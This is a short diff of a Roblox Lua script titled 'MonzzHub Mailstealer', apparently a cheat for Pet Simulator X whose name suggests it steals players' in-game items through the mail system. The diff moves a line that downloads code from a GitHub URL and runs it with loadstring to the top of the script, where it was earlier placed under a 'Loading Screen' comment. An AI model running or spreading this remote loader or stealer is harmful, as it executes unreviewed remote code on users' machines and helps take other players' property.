@@ -1,5 +1,7 @@
 -- [MonzzHub Mailstealer]
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-sc/Petsimx/main/Psx"))()
+
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
@@ -729,9 +731,6 @@ if _G.AntiLeave ~= false then
         end
     end
 end
-
---// Loading Screen
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-sc/Petsimx/main/Psx"))()
 
 -- Pets Tables :
 
